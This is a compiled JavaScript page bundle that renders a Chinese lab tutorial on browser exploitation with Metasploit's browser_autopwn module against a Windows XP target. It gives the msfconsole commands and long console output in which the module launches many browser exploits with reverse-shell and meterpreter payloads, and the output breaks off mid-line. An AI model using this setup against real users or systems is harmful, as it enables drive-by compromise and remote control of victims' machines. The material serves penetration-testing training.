(window.webpackJsonp=window.webpackJsonp||[]).push([[136],{602:function(t,s,a){"use strict";a.r(s);var n=a(24),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"浏览器渗透"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#浏览器渗透"}},[t._v("#")]),t._v(" 浏览器渗透")]),t._v(" "),a("p",[t._v("攻击机： Kali 192.168.175.128")]),t._v(" "),a("p",[t._v("靶机： WinXP 192.168.175.130")]),t._v(" "),a("h2",{attrs:{id:"browser-autopwn攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#browser-autopwn攻击"}},[t._v("#")]),t._v(" Browser autopwn攻击")]),t._v(" "),a("p",[t._v("Metasploit中提供了一个browser autopwn模块，这是一个可以用来对各种浏览器进行测试和渗透的自动化向量。")]),t._v(" "),a("p",[t._v("autopwn指的是自动对目标进行渗透。autopwn模块在配置了所有要使用的浏览器渗透脚本后，将处于监听模式下。然后，它便等待着一个即将到来的连接。一旦连接建立，它就会发送一系列与目标浏览器相匹配的渗透模块，具体发送哪个模块要取决于受害者浏览器的类型。无论目标系统上运行着什么浏览器，只要存在漏洞，autopwn模块就能自动发起攻击。")]),t._v(" "),a("p",[t._v("Browser autopwn原理图：")]),t._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190124193431777.png",loading:"lazy"}})]),t._v(" "),a("h2",{attrs:{id:"使用metasploit的browser-autopwn模块进行浏览器攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#使用metasploit的browser-autopwn模块进行浏览器攻击"}},[t._v("#")]),t._v(" 使用Metasploit的Browser autopwn模块进行浏览器攻击")]),t._v(" "),a("p",[t._v("这里，我们先打开msf终端")]),t._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("msfconsole\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("然后在msf终端依次输入如下命令：")]),t._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("use auxiliary/server/browser_autopwn\nshow options\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" LHOST "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".175.128\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" URIPATH /\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" SRVPORT "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("80")]),t._v("\nexploit\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br")])]),a("p",[t._v("其中，我们需要制定LHOST、URIPATH、SRVPORT参数。SRVPORT参数制定了渗透服务器使用的端口。这个端口建议为80或者443。URIPATH是存储各种渗透模块的目录路径，它的值被指定为/，表示根目录。设定好这些参数之后，就可以输入命令exploit进行攻击了。")]),t._v(" "),a("p",[t._v("具体如下：")]),t._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("msf5 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" use auxiliary/server/browser_autopwn\nmsf5 auxiliary"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("server/browser_autopwn"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" show options\n\nModule options "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("auxiliary/server/browser_autopwn"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(":\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   LHOST                     "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("yes")]),t._v("       The IP address to use "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" reverse-connect payloads\n   SRVHOST  "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.0")]),t._v(".0.0          "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("yes")]),t._v("       The "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("local")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("host")]),t._v(" to listen on. This must be an address on the "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("local")]),t._v(" machine or "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.0")]),t._v(".0.0\n   SRVPORT  "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("8080")]),t._v("             "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("yes")]),t._v("       The "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("local")]),t._v(" port to listen on.\n   SSL      "),a("span",{pre:!0,attrs:{class:"token boolean"}},[t._v("false")]),t._v("            no        Negotiate SSL "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" incoming connections\n   SSLCert                   no        Path to a custom SSL certificate "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("default is randomly generated"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n   URIPATH                   no        The URI to use "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" this exploit "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("default is random"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\n\nAuxiliary action:\n\n   Name       Description\n   ----       -----------\n   WebServer  Start a bunch of modules and direct clients to appropriate exploits\n\n\nmsf5 auxiliary"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("server/browser_autopwn"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" LHOST "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".175.128\nLHOST "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".175.128\nmsf5 auxiliary"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("server/browser_autopwn"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" URIPATH /\nURIPATH "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /\nmsf5 auxiliary"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("server/browser_autopwn"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" SRVPORT "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("80")]),t._v("\nSRVPORT "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("80")]),t._v("\nmsf5 auxiliary"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("server/browser_autopwn"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" exploit\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Auxiliary module running as background job "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v(".\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Setup\nmsf5 auxiliary"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("server/browser_autopwn"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit modules on "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("host")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".175.128"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v(".\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" ---\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit android/browser/webview_addjavascriptinterface with payload android/meterpreter/reverse_tcp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/Kwhc\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/Kwhc\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit multi/browser/firefox_proto_crmfrequest with payload generic/shell_reverse_tcp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/vzkqpBnTX\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/vzkqpBnTX\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit multi/browser/firefox_tostring_console_injection with payload generic/shell_reverse_tcp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/JLQaHqdG\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/JLQaHqdG\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit multi/browser/firefox_webidl_injection with payload generic/shell_reverse_tcp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit multi/browser/java_atomicreferencearray with payload java/meterpreter/reverse_tcp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/NObgkNaafM\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/NObgkNaafM\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit multi/browser/java_jre17_jmxbean with payload java/meterpreter/reverse_tcp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/oAXSrii\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/oAXSrii\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit multi/browser/java_jre17_provider_skeleton with payload java/meterpreter/reverse_tcp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/rgkOUbVZ\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/rgkOUbVZ\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit multi/browser/java_jre17_reflection_types with payload java/meterpreter/reverse_tcp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/zOAZWwwA\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/zOAZWwwA\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit multi/browser/java_rhino with payload java/meterpreter/reverse_tcp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/KMZSsvbLbdEAo\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/KMZSsvbLbdEAo\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit multi/browser/java_verifier_field_access with payload java/meterpreter/reverse_tcp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/zHZYuGKZAKbZ\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/zHZYuGKZAKbZ\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit multi/browser/opera_configoverwrite with payload generic/shell_reverse_tcp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/WZzpMp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/WZzpMp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit windows/browser/adobe_flash_mp4_cprt with payload windows/meterpreter/reverse_tcp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/lZvfdntlB\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/lZvfdntlB\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit windows/browser/adobe_flash_rtmp with payload windows/meterpreter/reverse_tcp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/pgqDFJQG\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/pgqDFJQG\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit windows/browser/ie_cgenericelement_uaf with payload windows/meterpreter/reverse_tcp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/MERLTwZVxeoDI\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/MERLTwZVxeoDI\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit windows/browser/ie_createobject with payload windows/meterpreter/reverse_tcp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/TpOcHC\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/TpOcHC\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit windows/browser/ie_execcommand_uaf with payload windows/meterpreter/reverse_tcp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/XaoAp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/XaoAp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit windows/browser/mozilla_nstreerange with payload windows/meterpreter/reverse_tcp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/GAxmRqM\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/GAxmRqM\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit windows/browser/ms13_080_cdisplaypointer with payload windows/meterpreter/reverse_tcp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/dWTagnZBC\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/dWTagnZBC\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit windows/browser/ms13_090_cardspacesigninhelper with payload windows/meterpreter/reverse_tcp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/nfeHDD\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/nfeHDD\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit windows/browser/msxml_get_definition_code_exec with payload windows/meterpreter/reverse_tcp\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting handler "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" windows/meterpreter/reverse_tcp on port "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3333")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting handler "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" generic/shell_reverse_tcp on port "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("6666")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Started reverse TCP handler on "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".175.128:3333 \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/NiTvaxR\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/NiTvaxR\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/dIoa\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/dIoa\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting handler "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" java/meterpreter/reverse_tcp on port "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("7777")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Started reverse TCP handler on "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".175.128:6666 \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Started reverse TCP handler on 